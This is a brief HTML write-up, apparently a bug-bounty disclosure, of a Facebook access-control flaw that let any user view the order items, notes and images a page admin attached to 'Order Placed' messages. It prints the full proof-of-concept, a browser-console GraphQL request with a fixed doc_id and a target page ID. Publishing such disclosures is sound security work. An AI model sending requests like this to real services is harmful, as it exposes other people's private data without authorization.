I"x<p>When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allows any user to view these order items of any Facebook page.</p>

<p>Send the following request in the browser console.<br />
pageID would be the ID of the target page.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new AsyncRequest('/api/graphql/').setData({variables:'{"pageID":"{Page_ID}"}',doc_id:2571623202931955}).send()
</code></pre></div></div>

<p>The response would contain the recent order items of the targeted page.</p>
